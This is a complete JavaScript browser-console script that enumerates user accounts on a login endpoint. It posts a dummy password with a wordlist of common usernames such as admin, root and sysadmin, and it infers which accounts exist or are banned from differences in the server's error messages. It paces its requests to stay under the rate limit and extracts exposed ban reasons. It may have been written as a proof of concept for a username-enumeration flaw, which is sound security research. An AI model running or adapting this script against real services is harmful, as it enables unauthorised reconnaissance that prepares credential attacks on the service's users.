(async () => {
    const CONFIG = {
        serverUrl: window.location.origin,

        password: "aaaaaaaa",

        requestsPerMinute: 4,

        durationMs: 10 * 60 * 1000,

        identities: ["admin", "administrator", "root", "i3", "sysadmin", "user", "usuario", "guest", "invitado", "anonymous", "test", "testing", "demo", "sandbox", "info", "support", "help", "contact", "hello", "mod", "moderator", "staff", "team", "bot", "system", "service", "api", "john", "jane", "alex", "chris", "david", "maria", "carlos", "sharkord", "owner", "dev", "developer"]
    };

    const DELAY_MS = Math.ceil(60_000 / CONFIG.requestsPerMinute);

    const results = {
        found: [],
        notFound: [],
        errors429: 0,
        errorsOther: [],
        rawLog: [],
        totalRequests: 0,
        startTime: Date.now()
    };

    const sleep = ms => new Promise(r => setTimeout(r, ms));

    const classify = (status, data) => {
        if (status === 429) return "429";
        if (!data?.errors) return "UNKNOWN";
        if (data.errors.password) return "EXISTS";
        if (data.errors.identity) {
            if (typeof data.errors.identity === "string" && data.errors.identity.startsWith("Identity banned")) {
                return "BANNED";
            }
            return "NOT_FOUND";
        }
        return "UNKNOWN";
    };

    console.log("%c[Script 1] Enumeration respecting rate limit", "color: cyan; font-weight: bold; font-size: 13px");
    console.log(`  Server:      ${CONFIG.serverUrl}\n` + `  Rate:        ${CONFIG.requestsPerMinute} req/min (delay ${DELAY_MS} ms)\n` + `  Duration:    10 minutes\n` + `  Wordlist:    ${CONFIG.identities.length} identities\n` + `  Estimate:    ~${Math.floor((10 * CONFIG.requestsPerMinute) / CONFIG.identities.length)} full passes`);

    const endTime = Date.now() + CONFIG.durationMs;
    let idx = 0;

    while (Date.now() < endTime) {
        const identity = CONFIG.identities[idx % CONFIG.identities.length];
        idx++;

        let status = null;
        let data = null;

        try {
            const res = await fetch(`${CONFIG.serverUrl}/login`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ identity, password: CONFIG.password })
            });

            status = res.status;
            data = await res.json().catch(() => null);
        } catch (e) {
            results.errorsOther.push({ identity, error: e.message });
            console.error(`[NET ERROR] ${identity}: ${e.message}`);
            await sleep(DELAY_MS);
            continue;
        }

        results.totalRequests++;
        const verdict = classify(status, data);
        const elapsed = ((Date.now() - results.startTime) / 1000).toFixed(0);

        results.rawLog.push({ identity, status, verdict, elapsed: `${elapsed}s` });

        switch (verdict) {
            case "EXISTS":
                results.found.push(identity);
                console.log(`%c[FOUND]     ${identity}  (HTTP ${status})`, "color: #00ff88; font-weight: bold");
                break;

            case "BANNED": {
                results.found.push(identity);
                const banReason = data?.errors?.identity?.replace(/^Identity banned:\s*/i, "").trim() || "(no reason)";
                console.log(`%c[BANNED]    ${identity}  (HTTP ${status}) — exposed reason: "${banReason}"`, "color: #ffcc00; font-weight: bold");
                break;
            }

            case "NOT_FOUND":
                results.notFound.push(identity);
                console.log(`[NOT FOUND] ${identity}`);
                break;

            case "429":
                results.errors429++;
                console.warn(`%c[429] Rate limited (req #${results.totalRequests}, identity: ${identity})`, "color: #ff6600");
                await sleep(DELAY_MS * 3);
                continue;

            default:
                results.errorsOther.push({ identity, status, data });
                console.warn(`[UNKNOWN]   ${identity}  HTTP ${status}`, data);
        }

        if (results.totalRequests % 20 === 0) {
            const remaining = Math.round((endTime - Date.now()) / 60_000);
            console.log(`%c[Progress] ${results.totalRequests} req | Found: ${results.found.length} | ` + `429s: ${results.errors429} | ~${remaining} min remaining`, "color: #888");
        }

        await sleep(DELAY_MS);
    }

    const durationMin = ((Date.now() - results.startTime) / 60_000).toFixed(1);

    console.log("%c\n══════════════════════════════════════════════════\n" + "  FINAL RESULTS — Script 1 (rate limit aware)\n" + "══════════════════════════════════════════════════", "color: cyan; font-weight: bold; font-size: 14px");

    console.table({
        "Total requests sent": results.totalRequests,
        "Identities FOUND": results.found.length,
        "Identities NOT found": results.notFound.length,
        "429 responses received": results.errors429,
        "Other errors": results.errorsOther.length,
        "Actual duration (min)": durationMin
    });

    if (results.found.length > 0) {
        console.log("%cConfirmed identities:", "color: #00ff88; font-weight: bold", results.found);
    } else {
        console.log("%cNo valid identities found.", "color: #888");
    }

    if (results.errors429 > 0) {
        console.warn(`⚠️  Received ${results.errors429} 429 responses even while respecting the rate limit.\n` + "   Possible cause: stricter rate limit than expected or window boundary.");
    }

    console.log("\nFull results available at: window.__enum1");
    window.__enum1 = results;
    return results;
})();
